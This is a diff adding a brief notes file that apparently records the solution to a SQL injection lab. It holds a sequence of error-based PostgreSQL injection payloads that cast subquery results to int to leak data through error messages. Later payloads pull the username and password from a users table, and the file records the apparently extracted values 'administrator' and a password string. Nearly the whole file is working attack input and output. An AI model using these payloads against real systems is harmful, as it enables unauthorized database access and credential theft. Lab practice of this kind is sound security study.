@@ -1,0 +1,16 @@
+' and cast((select 1) as int)-- -
+
+' and 1=cast((select 1) as int)-- -
+
+' and 1=cast((select username from users) as int)-- -
+
+
+' and 1=cast((select username from users LIMIT 1) as int)-- -
+
+administrator
+
+' and 1=cast((select password from users LIMIT 1) as int)-- -
+
+7jxr3uoomw8autcv1rqq
+
+ERROR: invalid input syntax for type [KIỂU DỮ LIỆU]: "[GIÁ TRỊ GÂY LỖI]"
